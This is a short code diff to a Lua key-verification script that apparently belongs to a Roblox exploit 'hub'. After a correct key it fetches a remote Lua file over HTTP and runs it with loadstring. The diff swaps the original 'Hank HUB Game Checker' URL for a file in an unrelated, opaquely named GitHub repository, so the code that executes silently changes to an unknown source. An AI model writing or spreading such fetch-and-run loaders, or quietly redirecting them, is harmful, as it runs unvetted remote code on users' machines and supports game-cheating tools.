@@ -557,7 +557,7 @@ Btn_Verify.MouseButton1Click:Connect(function()
         wait(5)
         notify("Jacob Hub","Correct key!",2)
         HankHubLogin:Destroy()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/HankRBXHelper/Hank-HUB-UI-Library/main/%5BHH%5D%20Hank%20HUB%20Game%20Checker.lua", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/doa69/lsdksldas/main/Text.lua", true))()
     else
         notify("Jacob Hub","Verifying..",5)
         wait(5)
